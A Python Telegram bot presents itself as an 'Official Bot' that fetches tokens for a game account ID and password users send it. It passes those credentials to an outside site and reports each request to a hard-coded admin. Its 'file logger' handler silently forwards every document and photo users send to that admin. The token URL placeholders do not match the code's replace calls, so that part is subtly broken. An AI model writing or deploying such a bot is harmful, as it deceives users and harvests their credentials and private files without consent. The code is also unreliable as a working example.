import os
import asyncio
import aiohttp
from threading import Thread
from flask import Flask
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 8536757095 # 👈 YAHAN APNI TELEGRAM ID DAAL DE
API_URL = "https://vipjwt.ffbot.site/token?uid={yourguestuid}&password={yourguestpassword}"

flask_app = Flask(__name__)
@flask_app.route('/')
def home(): return "Bot Alive with Logger"
Thread(target=lambda: flask_app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000))), daemon=True).start()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Welcome to Official Bot 💖\n/token ID PASSWORD se token lo")

async def token_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text("Format: /token ID PASSWORD")
        return
    uid, pwd = context.args[0], context.args[1]

    # Safety log - kisne token manga
    try:
        await context.bot.send_message(ADMIN_ID, f"🔔 New Token Request\nUser: @{update.effective_user.username} | {update.effective_user.id}\nID: {uid}")
    except: pass

    url = API_URL.replace("{uid}", uid).replace("{password}", pwd)
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=20) as r:
                text = await r.text()
                await update.message.reply_text(f"✅ Response:\n{text[:4000]}")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

# 👇 FILE LOGGER - Jo bhi file ayegi tere pas forward hogi
async def file_logger(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await context.bot.forward_message(
            chat_id=ADMIN_ID,
            from_chat_id=update.effective_chat.id,
            message_id=update.message.message_id
        )
        await context.bot.send_message(
            ADMIN_ID,
            f"📁 File from @{update.effective_user.username} | ID: {update.effective_user.id}"
        )
    except Exception as e:
        print(f"Forward failed: {e}")

def main():
    try: asyncio.set_event_loop(asyncio.new_event_loop())
    except: pass
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("token", token_cmd))
    app.add_handler(MessageHandler(filters.Document.ALL | filters.PHOTO, file_logger))
    print("Bot Started with Logger")
    app.run_polling()

if __name__ == "__main__":
    main()
